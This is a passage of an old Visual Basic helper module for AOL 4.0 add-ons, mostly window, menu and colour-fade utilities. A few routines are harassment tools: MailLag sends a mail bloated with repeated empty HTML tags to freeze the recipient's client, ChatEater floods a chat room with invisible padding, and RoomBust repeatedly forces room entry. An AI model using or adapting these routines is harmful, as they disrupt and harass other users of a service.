tt$ = tt$ + thelist.List(Y) + ", "
Next Y
timeout (0.01)
Text.Text = tt$
End Function
Function ListToText2(thelist As ListBox, Text As TextBox)
Dim Y
For Y = 0 To thelist.ListCount - 1
tt$ = tt$ + thelist.List(Y) & Chr(13)
Next Y
timeout (0.01)
Text.Text = tt$
End Function
Function SearchListBox(List, StringToSearchFor As String) As Long
'*STRINGTOSEARCHFOR IS NOT CASE SENSITIVE*
'*A RETURN OF -1 MEANS IT WAS NOT FOUND*
SearchListBox = SendMessageByString(List, LB_FINDSTRINGEXACT, 0, StringToSearchFor & Chr(0))
End Function
Function SearchComboBox(Combo, StringToSearchFor As String) As Long
'*STRINGTOSEARCHFOR IS NOT CASE SENSITIVE*
'*A RETURN OF -1 MEANS IT WAS NOT FOUND*
SearchComboBox = SendMessageByString(Combo, CB_FINDSTRINGEXACT, 0, StringToSearchFor & Chr(0))
End Function
Function GetLineFromTextBox(Thing, LineToGrab As Long) As String
Dim Length As Integer
Dim index As Integer
Dim LineLength As Integer
Dim CharactersIn As Integer
Dim buffer As String
Length = SendMessage(Thing, EM_GETLINECOUNT, 0, 0)
index = SendMessageByNum(Thing, EM_LINEINDEX, Length, 0)
LineLength = SendMessageByNum(Thing, EM_LINELENGTH, index, 0) + 1
buffer = String(LineLength + 2, 0)
Mid(buffer, 1, 1) = Chr(LineLength And &HFF)
Mid(buffer, 2, 1) = Chr(LineLength \ &H100)
CharactersIn = SendMessageByString(Thing, EM_GETLINE, LineToGrab, buffer)
GetLineFromTextBox = Left(buffer, CharactersIn)
End Function
Sub MailLag(Person As String, subject As String)
'lage the specified person for as long as two minutes
Dim beer, beer1, beer2, beer3, beer4, beer5, beer6, beer7, beer8, beer9, beer10, beer11
beer = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer1 = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer2 = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer3 = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer4 = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer5 = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer6 = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer7 = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer8 = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer9 = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer10 = "<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>"
beer11 = beer & beer1 & beer2 & beer3 & beer4 & beer5 & beer6 & beer7 & beer8 & beer9 & beer10
AOL40_Mail_Send Person, subject, beer11 & beer11 & beer11 & beer11
End Sub
Function GetMsgText(MsgHandle As Long) As String
'This gets the message from a msgbox.
Dim buffer As String
Dim BufferLength As Long
Dim Check As Long
Check = FindChildByClass(MsgHandle, "Static")
If Check = 0 Then
    Check = FindChildByClass(MsgHandle, "_AOL_Static")
End If
Check = GetWindow(Check, 2)
BufferLength = SendMessage(Check, WM_GETTEXTLENGTH, 0, 0)
buffer = String(BufferLength, Chr(0))
SendMessageByString Check, WM_GETTEXT, Len(buffer) + 1, buffer
buffer = TrimNull(buffer)
buffer = Trim(buffer)
GetMsgText = buffer
End Function
Function AOLMSG2() As Boolean
Dim Check As Long
Dim Button As Long
Check = FindWindow("#32770", vbNullString)
Button = FindChildByClass(Check, "Button")
If GetCaption(Check) <> "America Online" Then Exit Function
If Check <> 0 And Button <> 0 Then AOLMSG2 = True: Exit Function
AOLMSG2 = False
End Function
Function AOLMSG() As Long
Dim Check As Long
Dim Button As Long
Check = FindWindow("#32770", vbNullString)
Button = FindChildByClass(Check, "Button")
If GetCaption(Check) <> "America Online" Then Exit Function
If Check <> 0 And Button <> 0 Then AOLMSG = Check: Exit Function
AOLMSG = 0
End Function
Sub SetToGuest()
'This sets the combobox to the guest name.
On Error Resume Next
Dim SignOnComboBox As Long
Dim ScreenNames() As String
Dim SNCount As Long
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
Dim AOLHandle, AOLThread, AOLProcessThread, index
Dim NextPerson As Byte
Dim SignOnEdit As Long
Dim SignOnIcon As Long
SignOnComboBox = FindChildByClass(AOLGetSignOn, "_AOL_Combobox")
If SignOnComboBox = 0 Then Exit Sub 'Error Check
SNCount = SendMessage(SignOnComboBox, CB_GETCOUNT, 0, 0)
ReDim ScreenNames(SNCount - 1)
AOLHandle = SignOnComboBox 'gets the listbox handle
AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess) 'loads the aolprocess variable with the process identifier
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For index = 0 To SendMessage(AOLHandle, CB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, CB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Person$ = Trim(Person$)
ScreenNames(index) = Person$
Next index
Call CloseHandle(AOLProcessThread)
End If
For NextPerson = LBound(ScreenNames) To UBound(ScreenNames)
If ScreenNames(NextPerson) = "" Then GoTo Found
Next NextPerson
Exit Sub
Found:
PostMessage SignOnComboBox, CB_SETCURSEL, NextPerson + 1, 0 'Sets the cursel
AOLClick SignOnComboBox
DoEvents
    Do Until IsVisible(SignOnEdit) = False
    DoEvents
    Loop
DoEvents
AOLClick SignOnComboBox
End Sub
Sub SignOnAfterMsg(SN As String, PW As String, SignOnHandle As Long)
'This signs you on as a guest, after the incorrect password
'screen has popped up. Just like aol40SignOnAsAGuest, except
'this one doesn't redial.
Dim GuestIcon As Long
Dim GuestStatic As Long
Dim GuestEdit As Long
'Sets a do loop to check if the stuff is all there.
Do
DoEvents
GuestIcon = FindChildByClass(SignOnHandle, "_AOL_Icon")
GuestStatic = FindChildByClass(SignOnHandle, "_AOL_Static")
GuestEdit = FindChildByClass(SignOnHandle, "_AOL_Edit")
If IsVisible(AOLGetSignOn) = True Then Exit Sub
Loop Until GuestIcon <> 0 And GuestStatic <> 0 And GuestEdit <> 0
'Sets the pw and sign.
SetText GuestEdit, SN
GuestEdit = FindWindowEx(SignOnHandle, GuestEdit, "_AOL_Edit", vbNullString)
SetText GuestEdit, PW
'Clicks the ok button.
PostMessage GuestIcon, WM_LBUTTONDOWN, 0&, 0&
PostMessage GuestIcon, WM_LBUTTONUP, 0&, 0&
End Sub
Sub SignOnAsGuestNoReset(SN As String, PW As String)
'This signs you on as a guest, but it does not
'reset the window.
Dim GuestIcon As Long
Dim DialUp As Long
Dim SignOnIcon As Long
Dim GuestLogIn As Long
Dim GuestEdit As Long
Dim GuestStatic As Long
'Gets the Sign On Icon's Handle
SignOnIcon = FindChildByClass(AOLGetSignOn, "_AOL_Icon")
SignOnIcon = GetWindow(SignOnIcon, 2)
SignOnIcon = GetWindow(SignOnIcon, 2)
'Clicks the button
PostMessage SignOnIcon, WM_LBUTTONDOWN, 0&, 0&
PostMessage SignOnIcon, WM_LBUTTONUP, 0&, 0&
'Waits for the dial up screen.
    Do
    DoEvents
    DialUp = FindWindow("_AOL_Modal", vbNullString)
    Loop Until DialUp <> 0
'Waits for the guest log in screen.
        Do
        DoEvents
        GuestLogIn = FindWindow("_AOL_Modal", vbNullString)
        Loop Until GuestLogIn <> DialUp
'Makes sure the guest log in is fully loaded.
            Do
            DoEvents
            GuestEdit = FindChildByClass(GuestLogIn, "_AOL_Edit")
            GuestStatic = FindChildByClass(GuestLogIn, "_AOL_Static")
            GuestIcon = FindChildByClass(GuestLogIn, "_AOL_Icon")
            Loop Until GuestEdit <> 0 And GuestStatic <> 0 And GuestIcon <> 0
'Sets the SN in the screen name box.
SetText GuestEdit, SN
GuestEdit = FindWindowEx(GuestLogIn, GuestEdit, "_AOL_Edit", vbNullString)
SetText GuestEdit, PW
'Clicks the ok button.
PostMessage GuestIcon, WM_LBUTTONDOWN, 0&, 0&
PostMessage GuestIcon, WM_LBUTTONUP, 0&, 0&
End Sub
Function AOLGetSignOn()
'This gets the handle to the signon window.
Dim AOL As Long
Dim MDI As Long
Dim Check As Long
AOL = FindWindow("AOL Frame25", vbNullString)
MDI = FindChildByClass(AOL, "MDIClient")
Check = FindChildByTitle(MDI, "Welcome")
If Check = 0 Then
    Check = FindChildByTitle(AOLMDI, "Goodbye from America Online!")
    If Check = 0 Then
        Check = FindChildByTitle(AOLMDI, "Sign On")
        If Check = 0 Then AOLGetSignOn = 0: Exit Function
        AOLGetSignOn = Check
        Exit Function
    End If
    AOLGetSignOn = Check
    Exit Function
End If
AOLGetSignOn = Check
End Function
Function IsVisible(Handle As Long) As Boolean
'Checks to see if the window is visible.
Dim Check As Long
Check = IsWindowVisible(Handle)
If Check > 0 Then IsVisible = True
If Check = 0 Then IsVisible = False
End Function
Sub AOLClick(Handle As Long)
'Clicks the handle.
SendMessage Handle, WM_LBUTTONDOWN, 0&, 0
SendMessage Handle, WM_LBUTTONUP, 0&, 0
End Sub
Sub MenuItemCheck(Handle As Long, Position As Long)
'Checks a menu control. The menu submenu is the handle, and
'the menu item to check is the position.
CheckMenuItem Handle, Position, MF_BYPOSITION Or MF_CHECKED
End Sub
Sub MenuItemUnCheck(Handle As Long, Position As Long)
'Unchecks a menu control. The menu submenu is the handle, and
'the menu item to uncheck is the position.
CheckMenuItem Handle, Position, MF_BYPOSITION Or MF_UNCHECKED
End Sub
Sub MenuDestroy(Handle As Long)
'Destroys the specified menu. Note that menus that are part
'of another menu or assigned directly to a window, are
'automatically destroyed when the window is destroyed.
DestroyMenu Handle
End Sub
Sub MenuBarDraw(Handle As Long)
'Redraws the menu for the specified window.
DrawMenuBar Handle
End Sub
Sub MenuItemEnable(Handle As Long, Position As Long)
'Enables a menu item specified by the handle parameter.
EnableMenuItem Handle, Position, MF_BYPOSITION Or MF_ENABLED
End Sub
Sub MenuItemDisable(Handle As Long, Position As Long)
'Disables a menu item specified by the handle parameter.
EnableMenuItem Handle, Position, MF_BYPOSITION Or MF_DISABLED Or MF_GRAYED
End Sub
Function MenuGet(Handle As Long)
'This gets the menu's handle for a window. The handle cannot
'be a child window. Make sure its the parent of the window
'that you check.
MenuGet = GetMenu(Handle)
End Function
Function MenuGetCount(Handle As Long)
'Gets the number of menu entries for a menu.
MenuGetCount = GetMenuItemCount(Handle)
End Function
Function MenuGetID(Handle As Long, Position As Long)
'Gets the menu ID of the menu specified by the handle
'parameter, and by the position parameter.
MenuGetID = GetMenuItemID(Handle, Position)
End Function
Function MenuGetString(Handle As Long, Position As Long)
'Gets the text for the menu item.
Dim buffer As String
buffer = String(256, 0)
GetMenuString Handle, Position, buffer, Len(buffer), MF_BYPOSITION
MenuGetString = TrimNull(buffer)
End Function
Function MenuCreate()
'Creates a new menu (albeit there, you must use procedure
'calls to add menu items to the newly created menu). This
'function returns the newly created menu's handle.
MenuCreate = CreateMenu
End Function
Function MenuPopUpCreate()
'Creates a new pop-up menu. Like the MenuCreate, the newly
'created menu is empty. This function returns the newly
'created menu's handle.
MenuPopUpCreate = CreatePopupMenu
End Function
Function MenuGetSub(Handle As Long, Position As Long)
'This function locates and returns the handle of the sub
'menu that exists at the specified entry. If it does not
'exist, this function returns 0.
MenuGetSub = GetSubMenu(Handle, Position)
End Function
Function MenuGetSystem(Handle As Long)
'This gets the system menu of the window.
MenuGetSystem = GetSystemMenu(Handle, 0)
End Function
Sub MenuInsert(Handle As Long, Position As Long, Text As String)
'This inserts a menu into another menu, moving down any other
'menus if need be. The menu's text is specified by the Text
'parameter.
InsertMenu Handle, Position, MF_BYPOSITION, 0, Text
End Sub
Function IsAMenu(Handle As Long) As Boolean
'Checks to see if the handle is a menu or not.
Dim Check As Long
Check = IsMenu(Handle)
If Check > 0 Then IsAMenu = True
If Check = 0 Then IsAMenu = False
End Function
Sub MenuModify(Handle As Long, Position As Long, NewText As String)
'Modifies a menu's name for you.
ModifyMenu Handle, Position, MF_BYPOSITION Or MF_STRING, 0, NewText
End Sub
Sub MenuAttachPopUp(Handle As Long, MenuToAppendHandle As Long, Text As String)
AppendMenu Handle, MF_POPUP, MenuToAppendHandle, Text
End Sub
Function IsMaximized(Handle As Long) As Boolean
'Checks to see if the window is maximized.
Dim Check As Long
Check = IsZoomed(Handle)
If Check > 0 Then IsMaximized = True
If Check = 0 Then IsMaximized = False
End Function
Function IsMinimized(Handle As Long) As Boolean
'Checks to see if the window is minimized.
Dim Check As Long
Check = IsIconic(Handle)
If Check > 0 Then IsMinimized = True
If Check = 0 Then IsMinimized = False
End Function
Function GrabMailSubject(index As Long)
'Grabs the aol40 mail subject from the mail tree.
Dim buffer As String
Dim TextLen As Long
Dim Final As String
TextLen = SendMessage(MailTree, LB_GETTEXTLEN, index, 0)
buffer = String(TextLen, 0)
SendMessageByString MailTree, LB_GETTEXT, index, buffer
Final = Mid(buffer, InStr(1, buffer, vbTab) + 1)
Final = Mid(Final, InStr(1, Final, vbTab) + 1)
GrabMailSubject = Trim(Final)
End Function
Sub MailWaitForLoadFlash()
Do
DoEvents
M1% = MailCountFlash
timeout (1)
M2% = MailCountFlash
timeout (1)
M3% = MailCountFlash
Loop Until M1% = M2% And M2% = M3%
M3% = MailCountFlash
End Sub
Function MailTree()
'Returns the handle of the mail listbox.
Dim MTab As Long
Dim MTabPage As Long
Dim mTree As Long
MTab = FindChildByClass(AOL40MailHandle, "_AOL_TabControl")
MTabPage = FindChildByClass(MTab, "_AOL_TabPage")
mTree = FindChildByClass(MTabPage, "_AOL_Tree")
MailTree = mTree
End Function
Function MailHandle() As Long
'Returns the mail box handle without opening up a new mail.
MailHandle = FindChildByTitle(AOLMDI, GetUser & "'s Online Mailbox")
End Function
Sub WindowEnable(Handle As Long)
EnableWindow Handle, 1
End Sub
Sub WindowDisable(Handle As Long)
EnableWindow Handle, 0
End Sub
Function BustRoom(RoomName As String)
Do: DoEvents
Call KeyWord("aol://2719:2-2-" + RoomName$ + "")
Pause 0.3
WaitForOKOrRoom LCase(RoomName$)
X = FindChildByTitle(AOLMDI, LCase(RoomName$))
Loop Until X <> 0
End Function
Function RoomBust(prName As String, lbel As Label, Optional KillRoom As Boolean = True)
'this will keep trying to bust until lbel's
'caption changes.  Since it's hard for the use
'to do anything when yer program is running this function
'i'd use the mouse move sub to change the caption
If GetUser = "" Then
MsgBox "Get online!", vbCritical
RoomBust = "notonline"
Exit Function
End If
lbel.Caption = ""
If KillRoom = True Then
KillWin FindRoom
Pause 2
End If
AOL% = FindWindow("aol frame25", vbNullString)
tol% = FindChildByClass(AOL%, "AOL Toolbar")
tod% = FindChildByClass(tol%, "_AOL_Toolbar")
cmb% = FindChildByClass(tod%, "_AOL_Combobox")
edi% = FindChildByClass(cmb%, "Edit")
For ing = 1 To 3
cmb = GetWindow(cmb%, GW_HWNDNEXT)
Next ing
ClickIcon cmb
cnt = 0
If FindRoom <> 0 Then capt = GetWinText(FindRoom)
Do
If lbel.Caption <> "" Then
RoomBust = "fail"
Exit Do
End If
KeyWord "aol://2719:2-2-" & prName
Pause 0.3
'Settext edi%, "aol://2719:2-2-" & prName
'sendmessage edi%, WM_CHAR, 13, 0
'ClickIcon Cmb
cnt = cnt + 1
DoEvents
If LCase(GetWinText(FindRoom)) = LCase(prName) Then Exit Do
If GetWinText(FindRoom) <> capt Then Exit Do
KillWin (FindWindow("#32770", vbNullString))
Loop
lbel.Caption = "busted"
RoomBust = cnt
End Function
Sub AOLMakeMeParent(frm As Form)
AOL% = FindChildByClass(FindWindow("AOL Frame25", 0&), "MDIClient")
SetAsParent = SetParent(frm.hwnd, AOL%)
End Sub
Function SignedOnAsGuest() As Boolean
Dim DevAddy
PoPup 2, "A"
Pause 0.6
If AOLMSG2 = True Then
AOLMsgClose
SignedOnAsGuest = True
Else
Do: DoEvents
DevAddy = FindChildByTitle(AOLMDI, "Address Book")
Loop Until DevAddy <> 0
KillWin DevAddy
SignedOnAsGuest = False
End If
End Function
Function IsGuest() As Boolean
If AOL40_IsOnline = False Then Exit Function
PoPup 2, "A"
Do
    DoEvents
    msg% = FindWindow("#32770", "America Online")
    bok% = FindChildByTitle(AOLMDI, "Address Book")
    If bok <> 0 Then
        IsGuest = False
        KillWin bok
        Exit Function
    End If
    If msg <> 0 Then
        IsGuest = True
        KillWin msg
        Exit Function
    End If
Loop Until AOL40_IsOnline = False
End Function
Function ChatEater()
ChatSend "<font color=""#fefefe""><pre" & String(1913, " ")
Pause 0.6
ChatSend "<font color=""#fefefe"">.<pre" & String(1913, " ")
Pause 0.6
ChatSend "<font color=""#fefefe"">.<pre" & String(1913, " ")
Pause 0.7
ChatSend "<font color=""#fefefe"">.<pre" & String(1913, " ")
End Function
Function GetLBText(entry, LB_hWnd)
Dim lent As String * 256
Dim Text
Text = SendMessageByString(LB_hWnd, LB_GETTEXT, entry, lent)
GetLBText = lent
End Function
Function GetCBText(entry, CB_hWnd)
Dim lent As String * 256
Dim Text
Text = SendMessageByString(CB_hWnd, CB_GETLBTEXT, entry, lent)
GetCBText = lent
End Function
Public Sub FadePicturebox9Colors(Picturebox, R1, G1, B1, R2, G2, B2, R3, G3, B3, R4, G4, B4, R5, G5, B5, R6, G6, B6, r7, g7, b7, r8, g8, b8, R9, G9, B9)
On Error Resume Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static ThirdColor(3) As Double
Static ForthColor(3) As Double
Static FifthColor(3) As Double
Static SixthColor(3) As Double
Static SeventhColor(3) As Double
Static EightColor(3) As Double
Static NinethColor(3) As Double
Static SplitNum(3) As Double
Static DivideNum(3) As Double
Static Split2Num(3) As Double
Static Divide2Num(3) As Double
Static Split3Num(3) As Double
Static Divide3Num(3) As Double
Static Split4Num(3) As Double
Static Divide4Num(3) As Double
Static Split5Num(3) As Double
Static Divide5Num(3) As Double
Static Split6Num(3) As Double
Static Divide6Num(3) As Double
Static Split7Num(3) As Double
Static Divide7Num(3) As Double
Static Split8Num(3) As Double
Static Divide8Num(3) As Double
Dim FadeW As Integer
Dim Loo As Integer
Dim Loo0 As Integer
Dim Loo00 As Integer
Dim Loo000 As Integer
Dim Loo0000 As Integer
Dim Looo0000 As Integer
Dim Looo00000 As Integer
Dim Looo000000 As Integer
'Starting color
FirstColor(1) = R1
FirstColor(2) = G1
FirstColor(3) = B1
'Second color
SecondColor(1) = R2
SecondColor(2) = G2
SecondColor(3) = B2
'ThirdColor
ThirdColor(1) = R3
ThirdColor(2) = G3
ThirdColor(3) = B3
ForthColor(1) = R4
ForthColor(2) = G4
ForthColor(3) = B4
FifthColor(1) = R5
FifthColor(2) = G5
FifthColor(3) = B5
SixthColor(1) = R6
SixthColor(2) = G6
SixthColor(3) = B6
SeventhColor(1) = r7
SeventhColor(2) = g7
SeventhColor(3) = b7
EightColor(1) = r8
EightColor(2) = g8
EightColor(3) = b8
NinethColor(1) = R9
NinethColor(2) = G9
NinethColor(3) = B9
'Do some math
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)
Split2Num(1) = ThirdColor(1) - SecondColor(1)
Split2Num(2) = ThirdColor(2) - SecondColor(2)
Split2Num(3) = ThirdColor(3) - SecondColor(3)
Split3Num(1) = ForthColor(1) - ThirdColor(1)
Split3Num(2) = ForthColor(2) - ThirdColor(2)
Split3Num(3) = ForthColor(3) - ThirdColor(3)
Split4Num(1) = FifthColor(1) - ForthColor(1)
Split4Num(2) = FifthColor(2) - ForthColor(2)
Split4Num(3) = FifthColor(3) - ForthColor(3)
Split5Num(1) = SixthColor(1) - FifthColor(1)
Split5Num(2) = SixthColor(2) - FifthColor(2)
Split5Num(3) = SixthColor(3) - FifthColor(3)
Split6Num(1) = SeventhColor(1) - SixthColor(1)
Split6Num(2) = SeventhColor(2) - SixthColor(2)
Split6Num(3) = SeventhColor(3) - SixthColor(3)
Split7Num(1) = EightColor(1) - SeventhColor(1)
Split7Num(2) = EightColor(2) - SeventhColor(2)
Split7Num(3) = EightColor(3) - SeventhColor(3)
Split8Num(1) = NinethColor(1) - EightColor(1)
Split8Num(2) = NinethColor(2) - EightColor(2)
Split8Num(3) = NinethColor(3) - EightColor(3)
DivideNum(1) = SplitNum(1) / 18
DivideNum(2) = SplitNum(2) / 18
DivideNum(3) = SplitNum(3) / 18
Divide2Num(1) = Split2Num(1) / 16
Divide2Num(2) = Split2Num(2) / 16
Divide2Num(3) = Split2Num(3) / 16
Divide3Num(1) = Split3Num(1) / 16
Divide3Num(2) = Split3Num(2) / 16
Divide3Num(3) = Split3Num(3) / 16
Divide4Num(1) = Split4Num(1) / 16
Divide4Num(2) = Split4Num(2) / 16
Divide4Num(3) = Split4Num(3) / 16
Divide5Num(1) = Split5Num(1) / 16
Divide5Num(2) = Split5Num(2) / 16
Divide5Num(3) = Split5Num(3) / 16
Divide6Num(1) = Split6Num(1) / 18
Divide6Num(2) = Split6Num(2) / 18
Divide6Num(3) = Split6Num(3) / 18
Divide7Num(1) = Split7Num(1) / 18
Divide7Num(2) = Split7Num(2) / 18
Divide7Num(3) = Split7Num(3) / 18
Divide8Num(1) = Split8Num(1) / 18
Divide8Num(2) = Split8Num(2) / 18
Divide8Num(3) = Split8Num(3) / 18
FadeW = Picturebox.Width / 100
' Lets start fading!
For Loo = 0 To 12
Picturebox.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo
For Loo0 = 13 To 24
Picturebox.Line (Loo0 * FadeW - 10, -10)-(9000, 1000), RGB(SecondColor(1), SecondColor(2), SecondColor(3)), BF
DoEvents
SecondColor(1) = SecondColor(1) + Divide2Num(1)
SecondColor(2) = SecondColor(2) + Divide2Num(2)
SecondColor(3) = SecondColor(3) + Divide2Num(3)
Next Loo0
For Loo00 = 25 To 36
Picturebox.Line (Loo00 * FadeW - 10, -10)-(9000, 1000), RGB(ThirdColor(1), ThirdColor(2), ThirdColor(3)), BF
DoEvents
ThirdColor(1) = ThirdColor(1) + Divide3Num(1)
ThirdColor(2) = ThirdColor(2) + Divide3Num(2)
ThirdColor(3) = ThirdColor(3) + Divide3Num(3)
Next Loo00
For Loo000 = 37 To 49
Picturebox.Line (Loo000 * FadeW - 10, -10)-(9000, 1000), RGB(ForthColor(1), ForthColor(2), ForthColor(3)), BF
ForthColor(1) = ForthColor(1) + Divide4Num(1)
ForthColor(2) = ForthColor(2) + Divide4Num(2)
ForthColor(3) = ForthColor(3) + Divide4Num(3)
Next Loo000
For Loo0000 = 50 To 62
Picturebox.Line (Loo0000 * FadeW - 10, -10)-(9000, 1000), RGB(FifthColor(1), FifthColor(2), FifthColor(3)), BF
FifthColor(1) = FifthColor(1) + Divide5Num(1)
FifthColor(2) = FifthColor(2) + Divide5Num(2)
FifthColor(3) = FifthColor(3) + Divide5Num(3)
Next Loo0000
For Looo0000 = 63 To 75
Picturebox.Line (Looo0000 * FadeW - 10, -10)-(9000, 1000), RGB(SixthColor(1), SixthColor(2), SixthColor(3)), BF
